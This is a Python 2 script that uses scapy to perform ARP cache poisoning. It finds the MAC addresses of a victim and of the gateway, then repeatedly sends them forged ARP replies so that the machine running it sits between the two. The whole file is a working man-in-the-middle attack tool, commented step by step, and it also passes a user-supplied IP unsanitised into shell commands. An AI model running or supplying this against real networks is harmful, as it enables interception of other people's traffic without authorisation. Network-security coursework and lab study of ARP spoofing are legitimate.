import os, sys,socket, struct,time,commands,uuid
#############################################
#		is done to remove a WARNING 		#
import logging								#				
l=logging.getLogger("scapy.runtime")		#
l.setLevel(49)								#
#############################################
from scapy.all import *



def linux_cmd(cmd):
	ret = commands.getoutput(cmd)
	return ret



#get the IP of the dafault GW
def get_default_gateway():
	#gets the 3rd element of a row starting with 'defualt' from result
	#that originates from running 'ip r'
    get_gateway_command="ip r | awk \'/^default/{print $3}\'"
    return linux_cmd(get_gateway_command)
   
#checks if the program is running by root   
def isSuperUser():
	return (os.geteuid() ==0)   
   
   
   
#given an IP , get the MAC   
def get_MAC_from_IP(ip):
	# ping is optional (sends an arp WHO_HAS request)
	os.popen('ping -c 1 %s' % ip)  #run the given command in the command line

	# grep with a space at the end of IP address to make sure you get a single line
	fields = commands.getoutput('grep "%s " /proc/net/arp' % ip).split()
	if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
		return fields[3]
	else:
		print 'no response from', ip
		print 'exiting...'
		sys.exit(-1)

		return None
		
#gets to IPs and returns 2 MACs		
def get_MAC_of_2_IPs(IP_1,IP_2):
	MAC_1,MAC_2=get_MAC_from_IP(IP_1),get_MAC_from_IP(IP_2)
	return (MAC_1,MAC_2)

#this is the attack function. Here we actually send the poisoned ARP frames
def ARP_poisoning((routerIP,routerMAC),(victimIP,victimMAC),show=False):
	#opcode = 2 means that this is an ARP reply
	attackVictimPacket=ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC)  #hardware src is completed by the func
	attackRouterPacket=ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC)  #hardware src is completed by the func

	if(show):
		print "***************************************"
		print "packet to the victim:"
		print attackVictimPacket.show()  #print the arp packet
		print "***************************************"
		
		print ""
		print "packet to the router:" 
		print attackRouterPacket.show()  #print the arp packet
		print "***************************************"
		
	print ("Sending To Victim: "+attackVictimPacket.summary())
	print ("Sending To Router: "+attackRouterPacket.summary())
	send(attackVictimPacket)
	send(attackRouterPacket)
		




def main():
	
	times=8
	interval=1.5
	print'=====================================START======================================='	

			
	
	if(not isSuperUser()):
		print 'Must be a root (su) to run this program!'
		print 'exiting...'
		print '------------------------------------------------------------------------------'
		sys.exit(1)

	
	if (len(sys.argv)<2):
		print 'Error:\tNot enough args!!!'
		print 'Enter the IP address of the victim as arg '
		print 'ex:	python arp.py 10.0.0.4'
		print '-----------------------------------------------------------------------------'
		sys.exit(-1)
	if	(len(sys.argv)>3):
		print 'Error:\tToo many args!!!'
		print 'Enter the IP address of the victim as arg '
		print 'ex:	python arp.py 10.0.0.4'
		print '-----------------------------------------------------------------------------'
		sys.exit(-1)
		
	#get victim's IP from terminal	
	IP_victim	=	sys.argv[1]	

	#get router's IP - default GW or from teminal
	if((len(sys.argv)==2)):
		IP_router=get_default_gateway()
		
	if((len(sys.argv)==3)):	
		IP_router=sys.argv[2]
	
	
	#get MAC adresses
	(MAC_victim,MAC_router)=get_MAC_of_2_IPs(IP_victim,IP_router)

	router	=	(IP_router,MAC_router)	
	victim	=	(IP_victim,MAC_victim)
	
	#get the local hostname (the local computer name):
	hostname = socket.gethostname()
	#get the self IP address:
	ip = socket.gethostbyname("%s.local" % hostname)
	
	# uuid.getnode() gets the hardware address as a 48-bit positive integer.
	# The loop breaks the integer into octets and formats them to match the MAC addr. format
	attacker=	(ip,':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]))
	
	
	
	print'|\t STARTING! sending for '+str(times)+' times with intervals of '+str(interval)+'[sec]\t\t|'	
	print '-------------------------------------------------------------------------------'
	print ''
	print ('Attacker:\tIP:'+attacker[0]+'\t\tMAC:'+	str(attacker[1]))
	print ('Victim:  \tIP:'+victim[0]+	'\t\tMAC:'+	str(victim[1]))
	print ('Router:  \tIP:'+router[0]+	'\t\tMAC:'+	str(router[1]))
	print ""
	print "\t+++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
	print '\t+   ARP Packet fields:					+'
	print '\t+\tHardware type:\tEthernet\t[0x0001 ]	+'
	print '\t+\tProtocol type:\tIP\t\t[0x0800 ]	+' 
	print '\t+\tHardware size\t6\t\t[Bytes  ]	+'
	print '\t+\tProtocol size\t4\t\t[Bytes  ]	+'
	print '\t+\tOpcode\t\tReply(is-at)\t[0x0002 ]	+'
	print '\t+\tSRC. hardware\tMAC\t\t[MAC_add]	+'
	print '\t+\tSRC. protocol\tIP\t\t[IP_add ]	+'
	print '\t+\tDest. hardware\tMAC\t\t[MAC_add]	+'
	print '\t+\tDest. protocol\tIP\t\t[IP_add ]	+'
	print "\t+++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
	print ""

	# i = 0 ... times-1
	for i in xrange(times):
		printval=str(i+1)
		printval+=str('\\')+str(times)		
		print '----------------------------------['+printval+']------------------------------------'
		
		#now we'll send poisoned ARP packet to BOTH router and victim
		#To the router we'll present ourselves as the victim.
		#To the victim we'll present ourselves as the router.
		
		if(i==0):
			ARP_poisoning(router,victim,True)

		else:	
			ARP_poisoning(router,victim)
		
		
		time.sleep(interval)
	print'=====================================DONE======================================='	
	
	return 0

if __name__ == '__main__':
	main()

